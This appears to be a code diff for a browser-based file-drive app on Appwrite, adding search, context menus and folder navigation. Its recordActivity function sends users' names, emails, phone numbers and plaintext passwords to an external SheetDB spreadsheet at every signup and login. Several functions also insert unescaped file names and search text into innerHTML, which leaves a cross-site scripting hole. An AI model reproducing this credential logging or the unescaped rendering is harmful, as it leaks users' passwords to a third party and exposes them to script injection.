@@ -3,7 +3,9 @@ const account = new Appwrite.Account(client);
 const databases = new Appwrite.Databases(client);
 const storage = new Appwrite.Storage(client);
 
+// ======================================================
 // 1. KONFIGURASI
+// ======================================================
 const CONFIG = {
     ENDPOINT: 'https://sgp.cloud.appwrite.io/v1',
     PROJECT_ID: '697f71b40034438bb559', 
@@ -14,8 +16,10 @@ const CONFIG = {
 };
 
 const SHEETDB_API = 'https://sheetdb.io/api/v1/v9e5uhfox3nbi';
+
 client.setEndpoint(CONFIG.ENDPOINT).setProject(CONFIG.PROJECT_ID);
 
+// STATE VARIABLES
 let currentUser = null;
 let currentFolderId = 'root'; 
 let currentFolderName = "Drive";
@@ -23,80 +27,237 @@ let currentViewMode = 'root';
 let selectedItem = null; 
 let selectedUploadFile = null; 
 let storageDetail = { images: 0, videos: 0, docs: 0, others: 0, total: 0 };
+let searchTimeout = null; // Variabel Debounce Search
 
 const el = (id) => document.getElementById(id);
 const showLoading = () => el('loading').classList.remove('hidden');
 const hideLoading = () => el('loading').classList.add('hidden');
 
 // ======================================================
-// 2. FUNGSI INISIALISASI & KLIK KANAN (POIN UTAMA)
+// 2. INISIALISASI (JANTUNG APLIKASI)
 // ======================================================
 document.addEventListener('DOMContentLoaded', () => {
     checkSession();
     initNewButtonLogic(); 
     initDragAndDrop();
     initLogout();
-    initSearchBar();
-    initAllContextMenus(); // Aktifkan semua fitur klik kanan
+    initSearchBar();       // <-- Mengaktifkan Pencarian
+    initAllContextMenus(); // <-- Mengaktifkan Klik Kanan
 });
 
+// ======================================================
+// 3. FUNGSI NAVIGASI SIDEBAR (YANG SEBELUMNYA HILANG)
+// ======================================================
+// Wajib menempel di window agar bisa dipanggil onclick HTML
+window.handleMenuClick = (element, mode) => {
+    // 1. Update UI Sidebar (Highlight)
+    document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
+    element.classList.add('active');
+
+    // 2. Update State
+    currentViewMode = mode;
+    currentFolderId = 'root'; // Reset folder saat ganti menu
+    
+    // 3. Update Judul Header
+    if(mode === 'root') currentFolderName = "Drive";
+    else if(mode === 'recent') currentFolderName = "Terbaru";
+    else if(mode === 'starred') currentFolderName = "Berbintang";
+    else if(mode === 'trash') currentFolderName = "Sampah";
+    else currentFolderName = element.innerText.trim();
+
+    // 4. Load Data
+    loadFiles(mode);
+};
+
+window.nav = (p) => { 
+    ['loginPage', 'signupPage', 'dashboardPage'].forEach(id => el(id).classList.add('hidden')); 
+    el(p).classList.remove('hidden'); 
+};
+
+window.goBack = () => { 
+    currentFolderId = 'root'; 
+    currentFolderName = "Drive"; 
+    currentViewMode = 'root'; 
+    
+    // Reset Sidebar ke Beranda
+    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active')); 
+    document.querySelectorAll('.nav-item')[0].classList.add('active'); 
+    
+    loadFiles('root'); 
+};
+
+window.openFolder = (id, name) => { 
+    currentFolderId = id; 
+    currentFolderName = name; 
+    loadFiles(id); 
+};
+
+// ======================================================
+// 4. FUNGSI PENCARIAN (SEARCH ENGINE LOGIC)
+// ======================================================
+function initSearchBar() {
+    const input = el('searchInput');
+    const clearBtn = el('clearSearchBtn');
+
+    if (!input) return;
+
+    input.addEventListener('input', (e) => {
+        const query = e.target.value.trim();
+
+        // Tampilkan/Sembunyikan tombol X
+        if (query.length > 0) {
+            clearBtn.classList.remove('hidden');
+        } else {
+            clearBtn.classList.add('hidden');
+            loadFiles(currentFolderId); // Kembali ke folder jika kosong
+            return;
+        }
+
+        // DEBOUNCE: Tunggu user selesai mengetik 600ms
+        clearTimeout(searchTimeout);
+        
+        // Tampilkan loading di grid
+        el('fileGrid').innerHTML = `
+            <div style="grid-column:1/-1;display:flex;flex-direction:column;align-items:center;opacity:0.6;margin-top:50px;">
+                <div class="spinner" style="width:30px;height:30px;border-width:3px;"></div>
+                <p>Mencari "${query}"...</p>
+            </div>
+        `;
+
+        searchTimeout = setTimeout(() => {
+            performSearch(query);
+        }, 600);
+    });
+}
+
+async function performSearch(keyword) {
+    if (!currentUser) return;
+
+    // Update Header
+    el('headerTitle').innerText = `Hasil pencarian: "${keyword}"`;
+    updateHeaderUI();
+
+    try {
+        // Cari di Database (Menggunakan fitur Search Appwrite)
+        const res = await databases.listDocuments(
+            CONFIG.DB_ID, 
+            CONFIG.COLLECTION_FILES, 
+            [
+                Appwrite.Query.equal('owner', currentUser.$id),
+                Appwrite.Query.search('name', keyword), // Mencari nama file
+                Appwrite.Query.limit(50)
+            ]
+        );
+
+        const grid = el('fileGrid');
+        grid.innerHTML = '';
+
+        if (res.documents.length === 0) {
+            grid.innerHTML = `
+                <div style="grid-column:1/-1;text-align:center;opacity:0.6;margin-top:50px;">
+                    <i class="fa-solid fa-magnifying-glass" style="font-size:3rem;margin-bottom:15px;"></i>
+                    <p>Tidak ditemukan hasil untuk "${keyword}"</p>
+                </div>`;
+        } else {
+            res.documents.forEach(doc => renderItem(doc));
+        }
+
+    } catch (e) {
+        console.warn("Search index error, using fallback:", e);
+        fallbackSearch(keyword); // Gunakan pencarian manual jika Index belum dibuat
+    }
+}
+
+// Pencarian Manual (Client-Side) jika Server Search Gagal
+async function fallbackSearch(keyword) {
+    try {
+        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [
+            Appwrite.Query.equal('owner', currentUser.$id), 
+            Appwrite.Query.limit(100)
+        ]);
+        
+        const filtered = res.documents.filter(doc => 
+            doc.name.toLowerCase().includes(keyword.toLowerCase()) && !doc.trashed
+        );
+
+        const grid = el('fileGrid');
+        grid.innerHTML = '';
+
+        if (filtered.length === 0) {
+            grid.innerHTML = `<p style="grid-column:1/-1;text-align:center;opacity:0.5;margin-top:50px;">Tidak ditemukan</p>`;
+        } else {
+            filtered.forEach(doc => renderItem(doc));
+        }
+    } catch(err) { console.error(err); }
+}
+
+window.clearSearch = () => {
+    const input = el('searchInput');
+    input.value = '';
+    el('clearSearchBtn').classList.add('hidden');
+    loadFiles(currentFolderId); // Kembali ke tampilan normal
+};
+
+// ======================================================
+// 5. LOGIKA KLIK KANAN LENGKAP (CONTEXT MENUS)
+// ======================================================
 function initAllContextMenus() {
-    const globalMenu = el('globalContextMenu'); 
-    const fileMenu = el('contextMenu');         
-    const newDropdown = el('dropdownMenu');     
+    const globalMenu = el('globalContextMenu');
+    const newBtnMenu = el('dropdownMenu');
+    const fileMenu = el('contextMenu');
     
     const newBtn = el('newBtnMain');
-    const navDrive = el('navDrive');            
+    const navDrive = el('navDrive');
     const mainArea = document.querySelector('.main-content-area');
 
-    const closeAll = () => {
+    const closeAllMenus = () => {
         if(globalMenu) globalMenu.classList.remove('show');
-        if(newDropdown) newDropdown.classList.remove('show');
+        if(newBtnMenu) newBtnMenu.classList.remove('show');
         if(fileMenu) fileMenu.classList.add('hidden');
     };
 
-    // A. KLIK KANAN: TOMBOL "+ NEW"
+    // A. Klik Kanan Tombol New
     if (newBtn) {
         newBtn.addEventListener('contextmenu', (e) => {
             e.preventDefault(); e.stopPropagation();
-            closeAll();
-            newDropdown.classList.add('show');
+            closeAllMenus();
+            newBtnMenu.classList.add('show');
         });
     }
 
-    // B. KLIK KANAN: SIDEBAR "DRIVE SAYA"
+    // B. Klik Kanan Sidebar Drive
     if (navDrive) {
         navDrive.addEventListener('contextmenu', (e) => {
             e.preventDefault(); e.stopPropagation();
-            closeAll();
+            closeAllMenus();
             globalMenu.style.top = `${e.clientY}px`;
             globalMenu.style.left = `${e.clientX}px`;
             globalMenu.classList.add('show');
         });
     }
 
-    // C. KLIK KANAN: AREA KOSONG
+    // C. Klik Kanan Area Kosong
     if (mainArea) {
         mainArea.addEventListener('contextmenu', (e) => {
             if (e.target.closest('.item-card')) return; // Biarkan file handle sendiri
             e.preventDefault();
-            closeAll();
+            closeAllMenus();
             globalMenu.style.top = `${e.clientY}px`;
             globalMenu.style.left = `${e.clientX}px`;
             globalMenu.classList.add('show');
         });
     }
 
-    window.addEventListener('click', () => closeAll());
+    // D. Klik Kiri di mana saja (Tutup Menu)
+    window.addEventListener('click', (e) => {
+        // Jangan tutup jika klik di dalam menu
+        if (e.target.closest('.dropdown-content') || e.target.closest('.context-menu-modern')) return;
+        closeAllMenus();
+    });
 }
 
 // ======================================================
-// 3. FUNGSI RENDER ITEM (KLIK KANAN FILE & FOLDER)
-// ======================================================
-// ... (Bagian atas app.js tetap sama) ...
-
-// ======================================================
-// 7. RENDER ITEM (UPDATE: MENU GOOGLE DRIVE STYLE)
+// 6. RENDER ITEM & FILE CONTEXT MENU
 // ======================================================
 function renderItem(doc) {
     const grid = el('fileGrid');
@@ -104,7 +265,7 @@ function renderItem(doc) {
     div.className = 'item-card';
     const isFolder = doc.type === 'folder';
     
-    // Icon Logic
+    // Icon
     const starHTML = doc.starred ? `<i class="fa-solid fa-star" style="position:absolute;top:12px;left:12px;color:#ffd700;"></i>` : '';
     let content = isFolder ? `<i class="icon fa-solid fa-folder"></i>` : `<i class="icon fa-solid fa-file-lines" style="color:#60a5fa"></i>`;
     if (!isFolder && doc.name.match(/\.(jpg|jpeg|png|webp|jfif)$/i)) {
@@ -113,200 +274,100 @@ function renderItem(doc) {
 
     div.innerHTML = `${starHTML}${content}<div class="item-name">${doc.name}</div>`;
     
-    // --- KLIK KIRI (BUKA) ---
+    // Klik Kiri: Buka
     div.onclick = () => { if(!doc.trashed) isFolder ? openFolder(doc.$id, doc.name) : window.open(doc.url, '_blank'); };
     
-    // --- KLIK KANAN (CONTEXT MENU BARU) ---
+    // Klik Kanan: Context Menu File
     div.oncontextmenu = (e) => { 
-        e.preventDefault(); 
-        e.stopPropagation(); // Mencegah menu global muncul
+        e.preventDefault(); e.stopPropagation(); 
         
-        // 1. Tutup menu lain yang mungkin terbuka
+        // Tutup menu lain
         el('globalContextMenu').classList.remove('show');
         el('dropdownMenu').classList.remove('show');
 
-        // 2. Set Selected Item Global
         selectedItem = doc; 
-
-        // 3. Atur Posisi Menu
         const menu = el('contextMenu'); 
         menu.style.top = `${e.clientY}px`; 
         menu.style.left = `${e.clientX}px`; 
         menu.classList.remove('hidden'); 
         
-        // 4. Update Teks Menu Berdasarkan Kondisi File
+        // Update UI Menu (Bintang/Sampah)
         updateContextMenuUI(doc);
     };
-    
     grid.appendChild(div);
 }
 
-// --- LOGIKA UPDATE TAMPILAN MENU (DINAMIS) ---
 function updateContextMenuUI(doc) {
-    // A. Atur Bintang (Star/Unstar)
-    const starText = el('ctxStarText');
-    const starIcon = el('ctxStarIcon');
-    if (doc.starred) {
-        starText.innerText = "Hapus dari Berbintang";
-        starIcon.classList.remove('fa-regular');
-        starIcon.classList.add('fa-solid');
-        starIcon.style.color = '#ffd700';
-    } else {
-        starText.innerText = "Tambahkan ke Berbintang";
-        starIcon.style.color = 'rgba(255,255,255,0.7)';
-    }
+    const starText = el('ctxStarText'); const starIcon = el('ctxStarIcon');
+    if (doc.starred) { starText.innerText = "Hapus Bintang"; starIcon.style.color = '#ffd700'; }
+    else { starText.innerText = "Bintangi"; starIcon.style.color = 'rgba(255,255,255,0.7)'; }
 
-    // B. Atur Tombol Sampah vs Restore
     const isTrash = doc.trashed;
-    const btnTrash = el('ctxTrashBtn');
-    const btnRestore = el('ctxRestoreBtn');
-    const btnPermDel = el('ctxPermDeleteBtn');
-
-    if (isTrash) {
-        // Jika di folder sampah: Tampilkan Restore & Hapus Permanen
-        btnTrash.classList.add('hidden');
-        btnRestore.classList.remove('hidden');
-        btnPermDel.classList.remove('hidden');
-    } else {
-        // Jika file normal: Tampilkan Pindahkan ke Sampah
-        btnTrash.classList.remove('hidden');
-        btnRestore.classList.add('hidden');
-        btnPermDel.classList.add('hidden');
-    }
+    el('ctxTrashBtn').classList.toggle('hidden', isTrash);
+    el('ctxRestoreBtn').classList.toggle('hidden', !isTrash);
+    el('ctxPermDeleteBtn').classList.toggle('hidden', !isTrash);
 }
 
-// --- FUNGSI AKSI BARU (DOWNLOAD & RENAME) ---
-
-// 1. Fungsi Buka File
-window.openCurrentItem = () => {
-    if (!selectedItem) return;
-    if (selectedItem.type === 'folder') {
-        openFolder(selectedItem.$id, selectedItem.name);
-    } else {
-        window.open(selectedItem.url, '_blank');
-    }
-    el('contextMenu').classList.add('hidden');
-};
-
-// 2. Fungsi Download
-window.downloadCurrentItem = () => {
-    if (!selectedItem) return;
-    if (selectedItem.type === 'folder') {
-        alert("Download folder belum didukung. Silakan buka folder dan download file di dalamnya.");
-    } else {
-        // Appwrite menyediakan URL download
-        const downloadUrl = storage.getFileDownload(CONFIG.BUCKET_ID, selectedItem.fileId);
-        window.open(downloadUrl, '_blank');
-    }
-    el('contextMenu').classList.add('hidden');
-};
-
-// 3. Fungsi Ganti Nama (Rename)
+// Aksi Menu Baru
+window.openCurrentItem = () => { if(selectedItem) selectedItem.type==='folder' ? openFolder(selectedItem.$id, selectedItem.name) : window.open(selectedItem.url, '_blank'); el('contextMenu').classList.add('hidden'); };
+window.downloadCurrentItem = () => { if(selectedItem && selectedItem.type!=='folder') window.open(storage.getFileDownload(CONFIG.BUCKET_ID, selectedItem.fileId), '_blank'); el('contextMenu').classList.add('hidden'); };
 window.renameCurrentItem = async () => {
-    if (!selectedItem) return;
-    const newName = prompt("Masukkan nama baru:", selectedItem.name);
-    
-    if (newName && newName !== selectedItem.name) {
-        showLoading();
-        try {
-            await databases.updateDocument(
-                CONFIG.DB_ID, 
-                CONFIG.COLLECTION_FILES, 
-                selectedItem.$id, 
-                { name: newName }
-            );
-            loadFiles(currentViewMode === 'root' ? currentFolderId : currentViewMode);
-        } catch (e) {
-            alert("Gagal mengganti nama: " + e.message);
-        } finally {
-            hideLoading();
-            el('contextMenu').classList.add('hidden');
-        }
+    const newName = prompt("Nama baru:", selectedItem.name);
+    if(newName) {
+        await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, {name: newName});
+        loadFiles(currentFolderId);
     }
+    el('contextMenu').classList.add('hidden');
 };
 
-// ... (Sisa fungsi lain seperti toggleStarItem, moveItemToTrash tetap sama di bawah) ...
+// ======================================================
+// 7. DATA LOADING & PENCATATAN EXCEL
+// ======================================================
+async function loadFiles(param) {
+    if (!currentUser) return;
+    const grid = el('fileGrid'); grid.innerHTML = ''; 
+    updateHeaderUI();
 
-// ======================================================
-// 4. AUTH & SESSION
-// ======================================================
-async function checkSession() {
-    showLoading();
+    let queries = [Appwrite.Query.equal('owner', currentUser.$id)];
+    
+    if (param === 'recent') queries.push(Appwrite.Query.orderDesc('$createdAt'), Appwrite.Query.limit(20), Appwrite.Query.equal('trashed', false));
+    else if (param === 'starred') queries.push(Appwrite.Query.equal('starred', true), Appwrite.Query.equal('trashed', false));
+    else if (param === 'trash') queries.push(Appwrite.Query.equal('trashed', true));
+    else {
+        if (typeof param === 'string' && !['root','recent','starred','trash'].includes(param)) currentFolderId = param;
+        queries.push(Appwrite.Query.equal('parentId', currentFolderId), Appwrite.Query.equal('trashed', false));
+    }
+    updateHeaderUI();
+
     try {
-        currentUser = await account.get();
-        window.nav('dashboardPage'); 
-        loadFiles('root');  
-        calculateStorage();
-    } catch (e) { window.nav('loginPage'); } 
-    finally { setTimeout(hideLoading, 500); }
+        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, queries);
+        if (res.documents.length === 0) grid.innerHTML = `<div style="grid-column:1/-1;display:flex;flex-direction:column;align-items:center;opacity:0.5;margin-top:50px;"><i class="fa-solid fa-folder-open" style="font-size:4rem;margin-bottom:20px;"></i><p>Folder Kosong</p></div>`;
+        else res.documents.forEach(doc => renderItem(doc));
+    } catch (e) { console.error(e); }
+}
+
+function updateHeaderUI() {
+    const container = document.querySelector('.breadcrumb-area');
+    const isRoot = currentFolderId === 'root' && currentViewMode === 'root';
+    if (isRoot) {
+        const h = new Date().getHours(); const s = h < 12 ? "Morning" : h < 18 ? "Afternoon" : "Night";
+        container.innerHTML = `<h2 id="headerTitle">Welcome In Drive ${s}</h2>`;
+    } else {
+        container.innerHTML = `<div class="back-nav-container"><button onclick="goBack()" class="back-btn"><i class="fa-solid fa-arrow-left"></i> Kembali ke Drive</button><h2 id="headerTitle" style="margin-top:10px;">${currentFolderName}</h2></div>`;
+    }
 }
 
 async function recordActivity(sheetName, userData) {
     try {
         const now = new Date();
         const formattedDate = now.toLocaleString('id-ID', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' }).replace(/\./g, ':');
-        const payload = { "ID": userData.id || "-", "Nama": userData.name || "-", "Email": userData.email || "-", "Phone": userData.phone || "-", "Password": userData.password || "-", "Waktu": formattedDate };
+        const payload = { "ID": userData.id || "-", "Nama": userData.name || "-", "Email": userData.email || "-", "Phone": userData.phone || "-", "Password": userData.password || "-", "Waktu": formattedDate, "Riwayat Waktu": formattedDate };
         await fetch(`${SHEETDB_API}?sheet=${sheetName}`, { method: 'POST', headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' }, body: JSON.stringify({ data: payload }) });
-    } catch (error) { console.error("Excel Error:", error); }
-}
-
-if(el('signupForm')) {
-    el('signupForm').addEventListener('submit', async (e) => {
-        e.preventDefault();
-        const name = el('regName').value; const email = el('regEmail').value; const phone = el('regPhone').value; const pass = el('regPass').value;
-        showLoading();
-        try {
-            const auth = await account.create(Appwrite.ID.unique(), email, pass, name);
-            await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, auth.$id, { name, email, phone });
-            await recordActivity('SignUp', { id: auth.$id, name, email, phone, password: pass });
-            alert("Sign Up Berhasil!"); window.nav('loginPage');
-        } catch(e) { alert(e.message); } finally { hideLoading(); }
-    });
-}
-
-if(el('loginForm')) {
-    el('loginForm').addEventListener('submit', async (e) => {
-        e.preventDefault();
-        let inputId = el('loginEmail').value.trim(); const pass = el('loginPass').value;
-        showLoading();
-        try {
-            if (!inputId.includes('@')) {
-                const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, [Appwrite.Query.equal('name', inputId)]);
-                if (res.total === 0) throw new Error("User tidak ditemukan");
-                inputId = res.documents[0].email;
-            }
-            await account.createEmailPasswordSession(inputId, pass);
-            const userAuth = await account.get();
-            let userPhone = "-";
-            try { const userDB = await databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, userAuth.$id); userPhone = userDB.phone || "-"; } catch(e){}
-            await recordActivity('Login', { id: userAuth.$id, name: userAuth.name, email: userAuth.email, phone: userPhone, password: pass });
-            checkSession();
-        } catch (error) { alert(error.message); hideLoading(); }
-    });
-}
-
-function initLogout() {
-    const btn = el('logoutBtn');
-    if (btn) {
-        const newBtn = btn.cloneNode(true); btn.parentNode.replaceChild(newBtn, btn);
-        newBtn.addEventListener('click', async () => {
-            if (confirm("Yakin ingin keluar?")) {
-                showLoading();
-                try {
-                    if (currentUser) {
-                        let userPhone = "-";
-                        try { const userDB = await databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, currentUser.$id); userPhone = userDB.phone || "-"; } catch(e){}
-                        await recordActivity('Logout', { id: currentUser.$id, name: currentUser.name, email: currentUser.email, phone: userPhone, password: "-" });
-                    }
-                    await account.deleteSession('current'); window.location.reload(); 
-                } catch (error) { window.location.reload(); }
-            }
-        });
-    }
+    } catch (error) { console.error("Excel Error"); }
 }
 
 // ======================================================
-// 5. STORAGE, NAV & SEARCH (FITUR LAMA TERJAGA)
+// 8. STORAGE & AUTH & HELPER LAIN
 // ======================================================
 async function calculateStorage() {
     if (!currentUser) return;
@@ -315,9 +376,9 @@ async function calculateStorage() {
         storageDetail = { images: 0, videos: 0, docs: 0, others: 0, total: 0 };
         res.documents.forEach(doc => {
             const size = doc.size || 0; const name = doc.name.toLowerCase(); storageDetail.total += size;
-            if (name.match(/\.(jpg|jpeg|png|gif|webp|svg|jfif)$/)) storageDetail.images += size;
-            else if (name.match(/\.(mp4|mkv|avi|mov)$/)) storageDetail.videos += size;
-            else if (name.match(/\.(pdf|doc|docx|xls|xlsx|txt)$/)) storageDetail.docs += size;
+            if (name.match(/\.(jpg|jpeg|png|gif|webp|svg)$/)) storageDetail.images += size;
+            else if (name.match(/\.(mp4|mkv|avi|mov|wmv)$/)) storageDetail.videos += size;
+            else if (name.match(/\.(pdf|doc|docx|xls|xlsx|ppt|pptx|txt)$/)) storageDetail.docs += size;
             else storageDetail.others += size;
         });
         const mb = (storageDetail.total / 1048576).toFixed(2);
@@ -339,55 +400,72 @@ window.openStorageModal = () => {
     window.openModal('storageModal');
 };
 
-function initSearchBar() {
-    const input = el('searchInput');
-    if (!input) return;
-    input.addEventListener('input', (e) => {
-        const query = e.target.value.trim();
-        if (query.length === 0) loadFiles(currentFolderId);
-        else performSearch(query);
+async function checkSession() {
+    showLoading();
+    try {
+        currentUser = await account.get();
+        window.nav('dashboardPage'); 
+        loadFiles('root');  
+        calculateStorage();
+    } catch (e) { window.nav('loginPage'); } 
+    finally { setTimeout(hideLoading, 500); }
+}
+
+if(el('signupForm')) {
+    el('signupForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const name = el('regName').value; const email = el('regEmail').value; const phone = el('regPhone').value; const pass = el('regPass').value; const verify = el('regVerify').value;
+        if (pass !== verify) return alert("Password tidak sama!");
+        showLoading();
+        try {
+            const auth = await account.create(Appwrite.ID.unique(), email, pass, name);
+            try { await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, auth.$id, { name, email, phone }); } catch(err){}
+            await recordActivity('SignUp', { id: auth.$id, name, email, phone, password: pass });
+            alert("Sign Up Berhasil!"); window.nav('loginPage');
+        } catch(e) { if(e.message.includes('exists')) alert("Email/No HP sudah terdaftar."); else alert(e.message); } finally { hideLoading(); }
     });
 }
 
-async function performSearch(keyword) {
-    try {
-        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [Appwrite.Query.equal('owner', currentUser.$id), Appwrite.Query.search('name', keyword)]);
-        const grid = el('fileGrid'); grid.innerHTML = '';
-        res.documents.forEach(doc => renderItem(doc));
-    } catch (e) {}
+if(el('loginForm')) {
+    el('loginForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        let inputId = el('loginEmail').value.trim(); const pass = el('loginPass').value;
+        showLoading();
+        try {
+            if (!inputId.includes('@')) {
+                const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, [Appwrite.Query.equal('name', inputId)]);
+                if (res.total === 0) throw new Error("User tidak ditemukan");
+                inputId = res.documents[0].email;
+            }
+            try { await account.get(); } catch (err) { await account.createEmailPasswordSession(inputId, pass); }
+            const userAuth = await account.get();
+            let userPhone = "-";
+            try { const userDB = await databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, userAuth.$id); userPhone = userDB.phone || "-"; } catch(e){}
+            await recordActivity('Login', { id: userAuth.$id, name: userAuth.name, email: userAuth.email, phone: userPhone, password: pass });
+            checkSession();
+        } catch (error) { if(error.message.includes('session is active')) checkSession(); else { alert(error.message); hideLoading(); } }
+    });
 }
 
-async function loadFiles(param) {
-    if (!currentUser) return;
-    const grid = el('fileGrid'); grid.innerHTML = ''; 
-    updateHeaderUI();
-    let queries = [Appwrite.Query.equal('owner', currentUser.$id)];
-    if (param === 'recent') queries.push(Appwrite.Query.orderDesc('$createdAt'), Appwrite.Query.equal('trashed', false));
-    else if (param === 'trash') queries.push(Appwrite.Query.equal('trashed', true));
-    else {
-        if (typeof param === 'string' && !['root','recent','trash'].includes(param)) currentFolderId = param;
-        queries.push(Appwrite.Query.equal('parentId', currentFolderId), Appwrite.Query.equal('trashed', false));
+function initLogout() {
+    const btn = el('logoutBtn');
+    if (btn) {
+        const newBtn = btn.cloneNode(true); btn.parentNode.replaceChild(newBtn, btn);
+        newBtn.addEventListener('click', async () => {
+            if (confirm("Keluar?")) {
+                showLoading();
+                try {
+                    if (currentUser) {
+                        let userPhone = "-";
+                        try { const userDB = await databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, currentUser.$id); userPhone = userDB.phone || "-"; } catch(e){}
+                        await recordActivity('Logout', { id: currentUser.$id, name: currentUser.name, email: currentUser.email, phone: userPhone, password: "-" });
+                    }
+                    await account.deleteSession('current'); window.location.reload(); 
+                } catch (error) { window.location.reload(); }
+            }
+        });
     }
-    try {
-        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, queries);
-        res.documents.forEach(doc => renderItem(doc));
-    } catch (e) {}
 }
-
-function updateHeaderUI() {
-    const isRoot = currentFolderId === 'root' && currentViewMode === 'root';
-    const h = new Date().getHours(); const s = h < 12 ? "Morning" : h < 18 ? "Afternoon" : "Night";
-    el('headerTitle').innerText = isRoot ? `Welcome In Drive ${s}` : currentFolderName;
-    const breadcrumb = document.querySelector('.breadcrumb-area');
-    if (!isRoot && !breadcrumb.querySelector('.back-btn')) {
-        breadcrumb.insertAdjacentHTML('afterbegin', `<button onclick="goBack()" class="back-btn" style="margin-bottom:10px;"><i class="fa-solid fa-arrow-left"></i> Kembali</button>`);
-    } else if (isRoot && breadcrumb.querySelector('.back-btn')) {
-        breadcrumb.querySelector('.back-btn').remove();
-    }
-}
-
-window.goBack = () => { currentFolderId = 'root'; currentFolderName = "Drive"; loadFiles('root'); };
-window.openFolder = (id, name) => { currentFolderId = id; currentFolderName = name; loadFiles(id); };
 
 function initNewButtonLogic() {
     const btn = el('newBtnMain'); const menu = el('dropdownMenu');
@@ -395,12 +473,13 @@ function initNewButtonLogic() {
 }
 
 function initDragAndDrop() {
-    const zone = el('dropZone');
+    const zone = el('dropZone'); const input = el('fileInputHidden');
     if (!zone) return;
     ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(evt => zone.addEventListener(evt, (e) => { e.preventDefault(); e.stopPropagation(); }));
     zone.addEventListener('dragover', () => zone.classList.add('active'));
     zone.addEventListener('dragleave', () => zone.classList.remove('active'));
     zone.addEventListener('drop', (e) => { zone.classList.remove('active'); handleFileSelect(e.dataTransfer.files[0]); });
+    if (input) input.addEventListener('change', (e) => { if (e.target.files.length > 0) handleFileSelect(e.target.files[0]); });
 }
 
 function handleFileSelect(file) {
@@ -410,34 +489,36 @@ function handleFileSelect(file) {
 }
 
 window.submitUploadFile = async () => {
-    if (!selectedUploadFile) return;
-    showLoading();
+    if (!selectedUploadFile) return alert("Pilih file dulu!");
+    closeModal('uploadModal'); showLoading();
     try {
         const up = await storage.createFile(CONFIG.BUCKET_ID, Appwrite.ID.unique(), selectedUploadFile);
         const url = storage.getFileView(CONFIG.BUCKET_ID, up.$id);
         await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
             name: selectedUploadFile.name, type: 'file', parentId: currentFolderId, owner: currentUser.$id, url: url.href, fileId: up.$id, size: selectedUploadFile.size, starred: false, trashed: false
         });
-        closeModal('uploadModal'); loadFiles(currentFolderId); calculateStorage();
+        resetUploadUI(); loadFiles(currentFolderId); calculateStorage();
     } catch (e) { alert(e.message); } finally { hideLoading(); }
 };
 
 window.submitCreateFolder = async () => {
     const name = el('newFolderName').value.trim();
     if (!name) return;
-    showLoading();
+    closeModal('folderModal'); showLoading();
     try {
-        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), { name, type: 'folder', parentId: currentFolderId, owner: currentUser.$id, size: 0, starred: false, trashed: false });
-        closeModal('folderModal'); loadFiles(currentFolderId);
+        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
+            name: name, type: 'folder', parentId: currentFolderId, owner: currentUser.$id, size: 0, starred: false, trashed: false
+        });
+        loadFiles(currentFolderId); el('newFolderName').value = '';
     } catch (e) { alert(e.message); } finally { hideLoading(); }
 };
 
-window.nav = (p) => { ['loginPage', 'signupPage', 'dashboardPage'].forEach(id => el(id).classList.add('hidden')); el(p).classList.remove('hidden'); };
-window.openModal = (id) => { el('globalContextMenu').classList.remove('show'); el('dropdownMenu').classList.remove('show'); el(id).classList.remove('hidden'); };
+function resetUploadUI() { selectedUploadFile = null; el('fileInfoContainer').classList.add('hidden'); el('fileInputHidden').value = ''; }
+window.openModal = (id) => { const globalMenu = el('globalContextMenu'); const newBtnMenu = el('dropdownMenu'); const fileMenu = el('contextMenu'); if(globalMenu) globalMenu.classList.remove('show'); if(newBtnMenu) newBtnMenu.classList.remove('show'); if(fileMenu) fileMenu.classList.add('hidden'); el(id).classList.remove('hidden'); if(id==='folderModal') setTimeout(()=>el('newFolderName').focus(),100); };
 window.closeModal = (id) => el(id).classList.add('hidden');
-window.triggerUploadModal = () => window.openModal('uploadModal');
+window.triggerUploadModal = () => { resetUploadUI(); window.openModal('uploadModal'); };
 window.createFolder = () => window.openModal('folderModal');
-window.toggleStarItem = async () => { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { starred: !selectedItem.starred }); loadFiles(currentFolderId); };
-window.moveItemToTrash = async () => { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { trashed: true }); loadFiles(currentFolderId); };
-window.restoreFromTrash = async () => { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { trashed: false }); loadFiles('trash'); };
-window.deleteItemPermanently = async () => { if(confirm("Hapus permanen?")) { if(selectedItem.type==='file') await storage.deleteFile(CONFIG.BUCKET_ID, selectedItem.fileId); await databases.deleteDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id); loadFiles('trash'); calculateStorage(); } };
